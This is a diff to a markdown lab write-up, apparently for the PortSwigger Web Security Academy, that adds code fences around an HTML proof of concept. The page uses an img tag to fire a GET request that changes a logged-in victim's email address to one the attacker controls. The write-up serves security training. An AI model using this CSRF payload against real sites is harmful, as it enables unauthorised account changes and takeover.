@@ -48,13 +48,14 @@ a malicious HTML page was crafted to exploit this behavior.
 The exploit uses an image tag to trigger a GET request automatically
 when the page is loaded by the victim:
 
+```html
 <!DOCTYPE html>
 <html>
   <body>
     <img src="https://LAB-ID.web-security-academy.net/my-account/change-email?email=attacker@normal-user.net">
   </body>
 </html>
-
+```
 
 The HTML page was hosted on the exploit server and executed in the victim’s browser.
 As a result, the victim’s email address was changed without their consent,
